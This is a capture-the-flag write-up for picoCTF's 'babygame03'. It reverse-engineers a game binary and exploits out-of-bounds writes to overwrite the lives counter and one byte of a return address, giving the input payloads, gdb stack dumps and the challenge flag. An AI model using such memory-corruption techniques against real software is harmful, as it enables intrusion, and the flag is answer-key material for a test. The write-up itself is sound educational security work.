# babygame03
## Description
Break the game and get the flag.
Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you'll have to figure your way around the map.
You can connect with it using nc rhea.picoctf.net 52993.
## Hints
- Use 'w','a','s','d' to move around.
- There may be secret commands to make your life easy.
## Solution
- We're given [game3](./game3) executable. Connecting to the server in ipython:
```python
In [9]: from pwn import *

In [10]: p = remote("rhea.picoctf.net", 52993)
[x] Opening connection to rhea.picoctf.net on port 52993
[x] Opening connection to rhea.picoctf.net on port 52993: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 52993: Done

In [11]: p.interactive()
```
```
Player position: 4 4
Level: 1
End tile position: 29 89
Lives left: 50
#.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- We can move around using 'w', 'a', 's', 'd' keys. I noticed that with every move my Lives left decreases by 2. If my lives left reaches 0, the game ends:
```
Player position: 4 54
Level: 1
End tile position: 29 89
Lives left: 0
#.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
......................................................@...................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
No more lives left. Game over!
```
- If I hit the `#` character, the game ends:
```
Player position: 1 0
Level: 1
End tile position: 29 89
Lives left: 36
#.........................................................................................
@.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
> w
You hit an obstacle!
```
- I disassembled the game in IDA, after giving the variables some meaningful names, here is the pseudocode of various functions:
- `main` function:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int level; // [esp+0h] [ebp-AACh] BYREF
  int x_coord; // [esp+4h] [ebp-AA8h] BYREF
  int y_coord; // [esp+8h] [ebp-AA4h]
  _BYTE map[2700]; // [esp+13h] [ebp-A99h] BYREF
  char input_char; // [esp+A9Fh] [ebp-Dh]
  int v9; // [esp+AA0h] [ebp-Ch]
  int *p_argc; // [esp+AA4h] [ebp-8h]

  p_argc = &argc;
  init_player(&x_coord);
  level = 1;
  v9 = 0;
  init_map((int)map, &x_coord, &level);
  print_map((int)map, (int)&x_coord, &level);
  signal(2, (__sighandler_t)sigint_handler);
  do
  {
    input_char = getchar();
    move_player(&x_coord, input_char, (int)map, (int)&level);
    print_map((int)map, (int)&x_coord, &level);
    if ( x_coord == 29 && y_coord == 89 && level != 4 )
    {
      puts("You win!\n Next level starting ");
      ++v9;
      ++level;
      init_player(&x_coord);
      init_map((int)map, &x_coord, &level);
    }
  }
  while ( x_coord != 29 || y_coord != 89 || level != 5 || v9 != 4 );
  win(&level);
  return 0;
}
```
- `init_player` function:
```c
DWORD *__cdecl init_player(_DWORD *a1)
{
  _DWORD *result; // eax

  *a1 = 4;
  a1[1] = 4;
  result = a1;
  a1[2] = 50;
  return result;
}
```
- `init_map` function:
```c
void __cdecl init_map(int a1, _DWORD *a2, _DWORD *a3)
{
  int j; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; i <= 29; ++i )
  {
    for ( j = 0; j <= 89; ++j )
    {
      if ( i == 29 && j == 89 )
      {
        *(_BYTE *)(a1 + 2699) = 'X';
      }
      else if ( i == *a2 && j == a2[1] )
      {
        *(_BYTE *)(90 * i + a1 + j) = player_tile;
      }
      else if ( i == rand() % *a3 && j == rand() % *a3 )
      {
        *(_BYTE *)(90 * i + a1 + j) = '#';
      }
      else
      {
        *(_BYTE *)(90 * i + a1 + j) = '.';
      }
    }
  }
}
```
- `print_map` function:
```c
int __cdecl print_map(int map, int x_coord, _DWORD *level)
{
  int j; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  clear_screen();
  find_player_pos(map, level);
  find_end_tile_pos(map);
  print_lives_left(x_coord);
  for ( i = 0; i <= 29; ++i )
  {
    for ( j = 0; j <= 89; ++j )
      putchar(*(char *)(90 * i + map + j));
    putchar('\n');
  }
  return fflush(stdout);
}
```
- `move_player` function:
```c
int *__cdecl move_player(int *x_coord, char input_char, int map, _DWORD *level)
{
  int *result; // eax

  if ( x_coord[2] <= 0 )
  {
    puts("No more lives left. Game over!");
    fflush(stdout);
    exit(0);
  }
  if ( input_char == 'l' )
    player_tile = getchar();
  if ( input_char == 'p' )
    solve_round(map, x_coord, level);
  *(_BYTE *)(x_coord[1] + map + 90 * *x_coord) = '.';
  switch ( input_char )
  {
    case 'w':
      --*x_coord;
      break;
    case 's':
      ++*x_coord;
      break;
    case 'a':
      --x_coord[1];
      break;
    case 'd':
      ++x_coord[1];
      break;
  }
  if ( *(_BYTE *)(x_coord[1] + map + 90 * *x_coord) == '#' )
  {
    puts("You hit an obstacle!");
    fflush(stdout);
    exit(0);
  }
  *(_BYTE *)(x_coord[1] + map + 90 * *x_coord) = player_tile;
  result = x_coord;
  --x_coord[2];
  return result;
}
```
- `win` function:
```c
int __cdecl win(int *level)
{
  int result; // eax
  char s[60]; // [esp+0h] [ebp-48h] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Please create 'flag.txt' in this directory with your own debugging flag.");
    fflush(stdout);
    exit(0);
  }
  fgets(s, 60, stream);
  result = *level;
  if ( *level == 5 )
  {
    printf(s);
    return fflush(stdout);
  }
  return result;
}
```
- Here are some observations I made:
  - x_coord[2] is the number of lives left.
  - `win` checks if the level is 5, if it is, it prints the flag.
  - `v9` is some sort of counter that is incremented when the player reaches the end tile. It's not relevant to my exploit.
  - If the level is 4, it's a hardblock for us and we're not able to proceed to the next level.
  - There's no control flow path where `main` calls `win` function.
  - So we need to figure 3 things out:
    - Increase the number of lives to a large value.
    - Go from level 4 to level 5.
    - Call the `win` function when level is 5.
- Since number of lives is located just before the map. Similar to [babygame01](./babygame01.md), I can overwrite the number of lives by going back 4 positions from (0,0). I used the payload `aaaaawwwaaaws` to achieve the same (The `s` in the end is to move the player tile back on the map):
```
Player position: 0 86
Level: 1
End tile position: 29 89
Lives left: 771751972
#.....................................................................................@...
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- The number of lives is now a large value. Entering `p` will solve the level and move to the next level:
```
Player position: 4 4
Level: 2
End tile position: 29 89
Lives left: 49
.#........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- Entering `aaaaawwwaaawsp` two more times to reach level 4 and then entering `aaaaawwwaaaws` to overwrite the number of lives:
```
Player position: 0 86
Level: 4
End tile position: 29 89
Lives left: 771751971
......................................................................................@...
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- Here's the disassembly of `main`:
```
08049871 <main>:
 8049871: 8d 4c 24 04                   lea     ecx, [esp + 0x4]
 8049875: 83 e4 f0                      and     esp, -0x10
 8049878: ff 71 fc                      push    dword ptr [ecx - 0x4]
 804987b: 55                            push    ebp
 804987c: 89 e5                         mov     ebp, esp
 804987e: 53                            push    ebx
 804987f: 51                            push    ecx
 8049880: 81 ec b0 0a 00 00             sub     esp, 0xab0
 8049886: e8 c5 f8 ff ff                call    0x8049150 <__x86.get_pc_thunk.bx>
 804988b: 81 c3 75 27 00 00             add     ebx, 0x2775
 8049891: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 8049897: 50                            push    eax
 8049898: e8 69 fc ff ff                call    0x8049506 <init_player>
 804989d: 83 c4 04                      add     esp, 0x4
 80498a0: c7 85 54 f5 ff ff 01 00 00 00 mov     dword ptr [ebp - 0xaac], 0x1
 80498aa: c7 45 f4 00 00 00 00          mov     dword ptr [ebp - 0xc], 0x0
 80498b1: 83 ec 04                      sub     esp, 0x4
 80498b4: 8d 85 54 f5 ff ff             lea     eax, [ebp - 0xaac]
 80498ba: 50                            push    eax
 80498bb: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 80498c1: 50                            push    eax
 80498c2: 8d 85 67 f5 ff ff             lea     eax, [ebp - 0xa99]
 80498c8: 50                            push    eax
 80498c9: e8 65 f9 ff ff                call    0x8049233 <init_map>
 80498ce: 83 c4 10                      add     esp, 0x10
 80498d1: 83 ec 04                      sub     esp, 0x4
 80498d4: 8d 85 54 f5 ff ff             lea     eax, [ebp - 0xaac]
 80498da: 50                            push    eax
 80498db: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 80498e1: 50                            push    eax
 80498e2: 8d 85 67 f5 ff ff             lea     eax, [ebp - 0xa99]
 80498e8: 50                            push    eax
 80498e9: e8 65 fb ff ff                call    0x8049453 <print_map>
 80498ee: 83 c4 10                      add     esp, 0x10
 80498f1: 83 ec 08                      sub     esp, 0x8
 80498f4: 8d 83 16 d2 ff ff             lea     eax, [ebx - 0x2dea]
 80498fa: 50                            push    eax
 80498fb: 6a 02                         push    0x2
 80498fd: e8 8e f7 ff ff                call    0x8049090 <signal@plt>
 8049902: 83 c4 10                      add     esp, 0x10
 8049905: e8 66 f7 ff ff                call    0x8049070 <getchar@plt>
 804990a: 88 45 f3                      mov     byte ptr [ebp - 0xd], al
 804990d: 0f be 45 f3                   movsx   eax, byte ptr [ebp - 0xd]
 8049911: 8d 95 54 f5 ff ff             lea     edx, [ebp - 0xaac]
 8049917: 52                            push    edx
 8049918: 8d 95 67 f5 ff ff             lea     edx, [ebp - 0xa99]
 804991e: 52                            push    edx
 804991f: 50                            push    eax
 8049920: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 8049926: 50                            push    eax
 8049927: e8 07 fc ff ff                call    0x8049533 <move_player>
 804992c: 83 c4 10                      add     esp, 0x10
 804992f: 83 ec 04                      sub     esp, 0x4
 8049932: 8d 85 54 f5 ff ff             lea     eax, [ebp - 0xaac]
 8049938: 50                            push    eax
 8049939: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 804993f: 50                            push    eax
 8049940: 8d 85 67 f5 ff ff             lea     eax, [ebp - 0xa99]
 8049946: 50                            push    eax
 8049947: e8 07 fb ff ff                call    0x8049453 <print_map>
 804994c: 83 c4 10                      add     esp, 0x10
 804994f: 8b 85 58 f5 ff ff             mov     eax, dword ptr [ebp - 0xaa8]
 8049955: 83 f8 1d                      cmp     eax, 0x1d
 8049958: 75 6d                         jne     0x80499c7 <main+0x156>
 804995a: 8b 85 5c f5 ff ff             mov     eax, dword ptr [ebp - 0xaa4]
 8049960: 83 f8 59                      cmp     eax, 0x59
 8049963: 75 62                         jne     0x80499c7 <main+0x156>
 8049965: 8b 85 54 f5 ff ff             mov     eax, dword ptr [ebp - 0xaac]
 804996b: 83 f8 04                      cmp     eax, 0x4
 804996e: 74 57                         je      0x80499c7 <main+0x156>
 8049970: 83 ec 0c                      sub     esp, 0xc
 8049973: 8d 83 e8 e0 ff ff             lea     eax, [ebx - 0x1f18]
 8049979: 50                            push    eax
 804997a: e8 31 f7 ff ff                call    0x80490b0 <puts@plt>
 804997f: 83 c4 10                      add     esp, 0x10
 8049982: 83 45 f4 01                   add     dword ptr [ebp - 0xc], 0x1
 8049986: 8b 85 54 f5 ff ff             mov     eax, dword ptr [ebp - 0xaac]
 804998c: 83 c0 01                      add     eax, 0x1
 804998f: 89 85 54 f5 ff ff             mov     dword ptr [ebp - 0xaac], eax
 8049995: 83 ec 0c                      sub     esp, 0xc
 8049998: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 804999e: 50                            push    eax
 804999f: e8 62 fb ff ff                call    0x8049506 <init_player>
 80499a4: 83 c4 10                      add     esp, 0x10
 80499a7: 83 ec 04                      sub     esp, 0x4
 80499aa: 8d 85 54 f5 ff ff             lea     eax, [ebp - 0xaac]
 80499b0: 50                            push    eax
 80499b1: 8d 85 58 f5 ff ff             lea     eax, [ebp - 0xaa8]
 80499b7: 50                            push    eax
 80499b8: 8d 85 67 f5 ff ff             lea     eax, [ebp - 0xa99]
 80499be: 50                            push    eax
 80499bf: e8 6f f8 ff ff                call    0x8049233 <init_map>
 80499c4: 83 c4 10                      add     esp, 0x10
 80499c7: 8b 85 58 f5 ff ff             mov     eax, dword ptr [ebp - 0xaa8]
 80499cd: 83 f8 1d                      cmp     eax, 0x1d
 80499d0: 0f 85 2f ff ff ff             jne     0x8049905 <main+0x94>
 80499d6: 8b 85 5c f5 ff ff             mov     eax, dword ptr [ebp - 0xaa4]
 80499dc: 83 f8 59                      cmp     eax, 0x59
 80499df: 0f 85 20 ff ff ff             jne     0x8049905 <main+0x94>
 80499e5: 8b 85 54 f5 ff ff             mov     eax, dword ptr [ebp - 0xaac]
 80499eb: 83 f8 05                      cmp     eax, 0x5
 80499ee: 0f 85 11 ff ff ff             jne     0x8049905 <main+0x94>
 80499f4: 83 7d f4 04                   cmp     dword ptr [ebp - 0xc], 0x4
 80499f8: 0f 85 07 ff ff ff             jne     0x8049905 <main+0x94>
 80499fe: 83 ec 0c                      sub     esp, 0xc
 8049a01: 8d 85 54 f5 ff ff             lea     eax, [ebp - 0xaac]
 8049a07: 50                            push    eax
 8049a08: e8 af fd ff ff                call    0x80497bc <win>
 8049a0d: 83 c4 10                      add     esp, 0x10
 8049a10: 90                            nop
 8049a11: b8 00 00 00 00                mov     eax, 0x0
 8049a16: 8d 65 f8                      lea     esp, [ebp - 0x8]
 8049a19: 59                            pop     ecx
 8049a1a: 5b                            pop     ebx
 8049a1b: 5d                            pop     ebp
 8049a1c: 8d 61 fc                      lea     esp, [ecx - 0x4]
 8049a1f: c3                            ret
```
- Now we need to go to level 5 somehow. We can hijack the return address when we're in `move_player` to bypass the level 4 check. Using gdb to see the stack layout:
```
(gdb) b move_player
Breakpoint 1 at 0x8049538
(gdb) c
Continuing.
a

Breakpoint 1, 0x08049538 in move_player ()
(gdb) x/24x $esp
0xff96bd80:     0x0804c000      0xff96c924      0xff96c858      0x0804992c
0xff96bd90:     0xff96bdb0      0x00000061      0xff96bdbf      0xff96bdac
0xff96bda0:     0xf7f4c480      0xff96c920      0x00000000      0x00000004
0xff96bdb0:     0x00000001      0xfffffffc      0x2e000023      0x2e000000
0xff96bdc0:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
0xff96bdd0:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
```
- The return address to `main` `0x0804992c` is at `0xff96bd8c`. The map starts at `0xff96bdbf` (0x2e is `.` on the map). So the LSB of the return address is `0xff96bdbf` - `0xff96bd8c` = `0x33` or 51 bytes before the start of the map. If we can change the return address to `0x08049970`, we can bypass the level 4 check and reach level 5. 
- We only need to change one byte of the return address. `0x70` is `p` in ASCII. I used `lp` to change my player tile to `p`. 
- Then I used the payload `waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas` from (0,0) to clobber the return address and move to level 5:
```
Player position: 4 4
Level: 5
End tile position: 29 89
Lives left: 49
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....p.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- Running the payload `aaaaawwwaaaws` to overwrite the number of lives:
```
Player position: 0 86
Level: 5
End tile position: 29 89
Lives left: 771751971
......................................................................................p...
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
- Analysing the stack in `move_player` now:
```
(gdb) c
Continuing.
a

Breakpoint 1, 0x08049538 in move_player ()
(gdb) x/24x $esp
0xffe80230:     0x0804c000      0xffe80de4      0xffe80d18      0x0804992c
0xffe80240:     0xffe80270      0x00000061      0xffe8027f      0xffe8026c
0xffe80250:     0xffe80270      0x00000073      0xffe8027f      0xffe8026c
0xffe80260:     0xf7f2d480      0xffe80de0      0x00000000      0x00000005
0xffe80270:     0x00000001      0xfffffffc      0x2e000023      0x2e000000
0xffe80280:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
```
- The distance between the return address and the start of the map increased by 0x10 bytes, so there's now total 51+16 = 67 bytes between the return address and the start of the map. 
- Now `win` in `main` is called at `0x08049a08`, but there's 2 bytes difference. I experimented a bit and realised that I can also change the return address to `0x080499fe` (the last instruction in `main` whose 2nd LSB is `99`). 
- Since `0xfe` is not a valid ASCII character, I used pwn's function to send the payload:
```python
p.sendline("l\xfe")
```
- Modified my final payload to `waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas` to accommodate for the 16 additional bytes. Finally I got the flag `picoCTF{gamer_leveluP_fb9b377c}`. 
- This was definitely a very challenging problem but I learnt a lot from it :)